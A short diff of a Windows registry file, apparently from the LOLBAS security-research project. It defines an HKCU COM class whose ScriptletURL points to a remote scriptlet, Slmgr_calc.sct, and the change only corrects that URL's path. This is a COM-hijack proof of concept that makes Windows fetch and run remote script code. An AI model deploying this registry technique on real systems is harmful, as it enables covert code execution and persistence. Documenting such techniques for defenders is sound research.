@@ -18,7 +18,7 @@ Windows Registry Editor Version 5.00
 @="Scripting.Dictionary"
 
 [HKEY_CURRENT_USER\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL]
-@="https://raw.githubusercontent.com/api0cradle/LOLBAS/master/Payload/Slmgr_calc.sct"
+@="https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSScripts/Payload/Slmgr_calc.sct"
 
 [HKEY_CURRENT_USER\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID]
 @="Scripting.Dictionary"
